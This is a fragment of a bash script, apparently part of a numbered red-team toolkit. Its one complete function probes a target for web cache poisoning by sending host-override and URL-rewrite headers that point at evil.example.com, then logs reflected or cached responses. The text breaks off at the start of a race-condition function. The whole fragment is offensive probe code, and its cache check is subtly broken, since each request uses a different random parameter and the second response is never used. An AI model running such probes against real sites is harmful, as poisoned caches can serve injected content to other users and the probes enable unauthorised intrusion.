rt_94_web_cache_poisoning() {
    local target="${1:-$TARGET}"
    echo "[RT-94] Web Cache Poisoning"
    local cache_headers=(
        "X-Forwarded-Host: evil.example.com"
        "X-Original-Url: /admin"
        "X-Rewrite-Url: /admin"
        "X-HTTP-Host-Override: evil.example.com"
        "X-Forwarded-Scheme: https"
        "X-Forwarded-Proto: https"
        "X-Host: evil.example.com"
        "Forwarded: host=evil.example.com"
    )
    for header in "${cache_headers[@]}"; do
        local h_name; h_name=$(echo "$header" | cut -d: -f1)
        local h_val; h_val=$(echo "$header" | cut -d: -f2-)
        local resp1; resp1=$(curl -sk --max-time 8 \
            -H "$header" \
            -H "User-Agent: Mozilla/5.0" \
            -H "Pragma: no-cache" \
            "${target}/?cache_test=${RANDOM}" 2>/dev/null)
        local resp2; resp2=$(curl -sk --max-time 8 \
            -H "User-Agent: Mozilla/5.0" \
            "${target}/?cache_test=${RANDOM}" 2>/dev/null)
        if echo "$resp1" | grep -qi 'evil.example.com'; then
            echo "[CACHE-POISON] ${h_name} reflected in cache" >> "$OUTPUT_DIR/rt94_cache_poison.txt"
        fi
        if echo "$resp1" | grep -qiE '(X-Cache: hit|X-Cache-Status: HIT|CF-Cache|Age:|x-cache)'; then
            echo "[CACHE-DETECT] ${h_name} cache detected" >> "$OUTPUT_DIR/rt94_cache_poison.txt"
        fi
    done
}

rt_95_race_condition_tootu() {
